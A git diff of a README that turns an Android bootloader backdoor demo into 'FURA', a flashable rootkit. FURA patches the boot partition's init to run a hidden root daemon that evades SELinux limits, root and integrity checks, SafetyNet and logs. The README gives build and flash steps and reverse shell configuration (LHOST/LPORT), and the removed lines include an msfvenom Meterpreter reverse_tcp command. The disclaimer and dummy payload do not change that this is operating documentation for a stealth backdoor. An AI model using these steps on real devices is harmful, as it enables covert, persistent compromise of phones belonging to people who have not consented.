@@ -1,108 +1,173 @@
-# Unlocked bootloader backdoor demo for Android
+# Flashable Usermode Rootkit for Android
 
-### [An article with full explaination / Статья на хабре с полным пояснением](https://habr.com/ru/post/541190/)
+#### A reworked version of [unlocked-bootloader-backdoor-demo](https://github.com/LuigiVampa92/unlocked-bootloader-backdoor-demo) by LuigiVampa92
 
-This is a tool that installs a custom binary into a system partition. This binary runs as a system daemon with root privileges and not restricted by SELinux policies. This tool is based on [Magisk](https://github.com/topjohnwu/Magisk) source code, but does not necessary require root or magisk preinstalled on the device. So basically this IS the magisk but only the part that injects new SELinux policies. It injects magiskinit binary in boot partition but does not install or use any other magisk tools. It also does not add any magisk files to device filesysytem, which allows it to avoid simple root detection tools, but unfortunately it is still detectable by SafetyNet.         
+#### This is currently an experimental work. Stability is not guaranteed.
 
-The goal of this is to show that unlocking the bootloader can expose your device to an attacker with physical access.
+FURA is a systemless flashable backdoor installed into boot partition, particularly into _init_ binary.
+On boot, it launches a system daemon with root privileges and unrestricted SELinux context, which is also hidden from process list.
+Since it's operating within ramdisk, this tool can bypass most root checks, integrity checks, etc. and presumably cannot be detected without root _(not even by ADB shell)_.
 
-I successfully tested it on android 9 with normal init process and android 10 with two-staged init. It should work on other configurations as well but there can be troubles.
+Unlike its predecessor, this rootkit can bypass SafetyNet, since it doesn't need to modify system partition. \
+However, it can't bypass hardware checks, such as hardware-backed SafetyNet on newer devices. 
 
-In this repo the embedded binary is made for the demo purposes only. It just drops a line to logcat once in 5 seconds, but you cat replace it with your own if you want. For example, if you are on Kali you can generate the reverse shell payload:
-```
-$ rm revshell/revshell
-$ msfvenom -p linux/aarch64/meterpreter/reverse_tcp LHOST=<YOUR_LISTENER_IP> LPORT=<YOUR_LISTENER_PORT> -f elf > revshell/revshell
-```
-After that you can build the packages and flash your binary instead of the one provided with the repo.  
+The daemon is a custom executor (sort of a service manager) for an arbitrary payload. 
+It runs silently and normally leaves no traces in _dmesg_, _logcat_, etc., unlike a regular service run by _init_ in loop.
+
+FURA uses SELinux to its own advantage: not only to bypass stock policy restrictions, but to hide itself from the rest of the system.
+
+This tool, like its predecessor, is based on [Magisk](https://github.com/topjohnwu/Magisk) source code, but does not necessary require root or Magisk preinstalled on the device. 
+It mostly uses a part of MagiskInit to patch SELinux policy.
 
 ## Prerequisites
 
-- First, you have to install android SDK for your OS if you haven't already.
-- Second, make sure you have python3 installed.
-
-After that you are all set up.
+- Python 3
+- Android SDK
+- ADB / Fastboot tools
+- Custom recovery image for your device (TWRP is recommended)
+- ##### **No Magisk installed on device!!!** &ensp; (compatibility issues cause bootloop)
 
 ## Build
 
-The result package is a TWRP sideloadable zip file.
+_cd_ into main project directory.
 
-set a ANDROID_SDK_ROOT variable in your shell. For example:  
+Set ANDROID_SDK_ROOT variable in your shell. For example:  
 ```
-$ ANDROID_SDK_ROOT=/usr/lib/android-sdk
-$ export ANDROID_SDK_ROOT
+$ export ANDROID_SDK_ROOT=/opt/android-sdk
 ```
 
-Prepare NDK for the build:
+Install and configure NDK:
 ```
 $ ./build_revshell.py ndk
 ```
 
-Run the build:
+Run the build script:
 ```
+$ ./build_revshell.py clean      # before rebuild if changed config
 $ ./build_revshell.py
 ```
 
-## Download
+The result is a sideloadable _.zip_ package which can be installed with TWRP or other recovery.
 
-You can download release packages directly:
-- [zip_reverse_shell_install.zip](https://github.com/LuigiVampa92/unlocked-bootloader-backdoor-demo/releases/download/v1.0/zip_reverse_shell_install.zip)
-- [zip_reverse_shell_uninstall.zip](https://github.com/LuigiVampa92/unlocked-bootloader-backdoor-demo/releases/download/v1.0/zip_reverse_shell_uninstall.zip)
+_Note_: if using reverse shell payloads (such as ReverseSSH, Meterpreter, etc.), set your LHOST and LPORT in `config.prop` before building.
 
-## Install
+_Note_: if SELinux is _permissive_ or _off_ on the target device, you can use alternative hiding method. See `config.prop` for details.
 
-Run TWRP on your device.
+_Note_: you can disable logging (logcat and selinux) by setting `release=True` in the end of `build_revshell.py`.
 
-Start sideload feature in Advanced/Sideload and then run:
+
+## Deploy
+
+#### Install
+
+Run TWRP on your device:
 ```
-$ adb sideload zip_reverse_shell_install.zip
+$ fastboot boot twrp.img
 ```
 
-Check out the output log carefully. If you have been warned that you need to backup original partitions then you have to run the command below BEFORE rebooting into system, otherwise you will not be able to uninstall this tool properly and will have to find stock boot image for your device somewhere and flash it.
+Start sideload feature in Advanced / Sideload and then run:
+```
+$ adb sideload zip_reverse_shell_v2.zip
+```
+
+At this moment, **do not reboot** right away. Backup original boot partition:
 ```
 $ adb pull /tmp/backup_original_partitions .
 ```
 
-Reboot into system.
+Run the command **before** rebooting into system, otherwise you will not be able to uninstall this tool properly and will have to find stock boot image for your device somewhere and flash it.
 
-You should now be able to see new lines in logcat:
+Reboot into system after you have backups on your PC.
 
+#### Uninstall
+
+You need a backup of original partitions made during installation. Move it to _/tmp_:
 ```
-$ adb logcat | grep revshell
-01-31 23:42:07.587  3589  3589 D revshell: Start successfull!
-01-31 23:42:07.588  3589  3589 D revshell: Signals are set to ignore
-01-31 23:42:07.588  3589  3589 D revshell: Hey I'm a revshell process!
-01-31 23:42:07.588  3589  3589 D revshell: My PID -- 3589
-01-31 23:42:07.588  3589  3589 D revshell: My parent PID -- 1
-01-31 23:42:07.588  3589  3589 D revshell: My UID -- 0
-01-31 23:42:07.588  3589  3589 D revshell: Awaiting encrypted FS decryption now...
-01-31 23:42:27.597  3589  3589 D revshell: FS has been decrypted!
-01-31 23:42:27.597  3589  3589 D revshell: Starting reverse shell now
-01-31 23:42:32.597  3589  3589 D revshell: tick ! 25 seconds since process started
-01-31 23:42:37.598  3589  3589 D revshell: tick ! 30 seconds since process started
-01-31 23:42:42.599  3589  3589 D revshell: tick ! 35 seconds since process started
-01-31 23:42:47.600  3589  3589 D revshell: tick ! 40 seconds since process started
+$ adb push backup_original_partitions /tmp/
 ```
 
-## Uninstall
-
-Use zip_reverse_shell_uninstall.zip to properly uninstall this tool. 
-
-If during installation you have made a backup of original partitions then run:
-```
-$ adb push backup_original_partitions /tmp/backup_original_partitions
-```
-
-Start sideload feature in Advanced/Sideload and then run:
+Start sideload feature in Advanced / Sideload and then run:
 ```
 $ adb sideload zip_reverse_shell_uninstall.zip
 ```
 
 Reboot into system.
 
+... or you can just flash stock boot image if you have one:
+```
+$ fastboot flash boot boot.img
+```
+
+#### Installation scripts
+
+There are installation scripts to automate install / reinstall process. \
+Before running one, rename or symlink your TWRP image as `twrp` in your current directory.
+
+Simply connect your device via USB and switch it into Fastboot mode.
+After installation, backups will be saved automatically.
+
+`install.sh` to install and save backup image. \
+`reinstall.sh` to reinstall quickly (if you have the backup).\
+`uninstall.sh` to restore original boot image from backup.
+
+## Test
+
+The default payload in this repo is a dummy program that writes stuff to logcat. 
+
+After boot is completed, you should be able to see its output:
+
+```
+$ adb logcat | grep revshell
+03-18 00:34:41.732  2381  2381 D revshell_exec: Remounting /sbin to avoid mount detection ...
+03-18 00:34:41.732  2381  2381 D revshell_exec: Setting up /mnt/secure/temp
+03-18 00:34:41.732  2381  2381 D revshell_exec: Awaiting decryption ...
+03-18 00:34:41.732  2381  2381 D revshell_exec: Decrypted. Setting persistence dir at /data/adb/.aura
+03-18 00:34:46.817  2381  2381 I revshell_exec: restarting ...
+03-18 00:34:46.884  3197  3197 D revshell: Start successfull!
+03-18 00:34:46.885  3197  3197 D revshell: Signals are set to ignore
+03-18 00:34:46.885  3197  3197 D revshell: Hey I'm a revshell process!
+03-18 00:34:46.885  3197  3197 D revshell: My PID -- 3197
+03-18 00:34:46.885  3197  3197 D revshell: My parent PID -- 2381
+03-18 00:34:46.885  3197  3197 D revshell: My UID -- 0
+03-18 00:34:46.885  3197  3197 D revshell: Awaiting encrypted FS decryption now...
+03-18 00:34:51.241  2381  2381 D revshell_exec: Checking PID
+03-18 00:34:51.311  3197  3197 D revshell: FS has been decrypted!
+03-18 00:34:51.311  3197  3197 D revshell: Starting reverse shell now
+03-18 00:34:56.242  2381  2381 D revshell_exec: Checking PID
+03-18 00:34:56.312  3197  3197 D revshell: tick ! 10 seconds since process started
+03-18 00:35:01.244  2381  2381 D revshell_exec: Checking PID
+03-18 00:35:01.312  3197  3197 D revshell: tick ! 15 seconds since process started
+03-18 00:35:06.244  2381  2381 D revshell_exec: Checking PID
+```
+
+You can disable logging (logcat and selinux) by setting `release=True` in the end of `build_revshell.py`.
+
+## Custom payloads
+
+To embed a custom payload, simply put your executable into `revshell/{arch}/` as `revshell`. It is not required to place executables for all archs: those where `revshell` is absent will use default payload. 
+
+For more details on custom payloads, see _revshell_ directory.
+
+
 ## Acknowledgments
 
-Great thanks to topjohnwu and magisk contributors for their amazing work and incredible contribution to android tinkerers community. This Demo wouldn't even exist without them. 
+Thanks to LuigiVampa92 for a [great article](https://habr.com/ru/articles/541190/) on a physical access attack concept for devices with unlocked bootloader.
 
-## Links:
+Thanks to topjohnwu and all Magisk maintainers for that brilliant swiss army knife for Android and a great contribution to Android modding community.
 
-[Original Magisk repository](https://github.com/topjohnwu/Magisk)
+## Links
+
+[Magisk repository](https://github.com/topjohnwu/Magisk) \
+[Original system backdoor](https://github.com/LuigiVampa92/unlocked-bootloader-backdoor-demo)
+
+
+## Disclaimer
+    
+    This tool is designed for educational purposes only. You may utilize this software solely on 
+    your personal devices. Any attempt to use this tool on a device without explicit authorization 
+    is unethical and may violate privacy laws.
+    
+    Running this tool may result in bricking or damaging your device. Create backups of your data
+    and /boot (/boot_a, /boot_b) partitions before using the tool. 
+    
+    Use at your own risk. The developer is not responsible for any damage or loss caused by this tool.
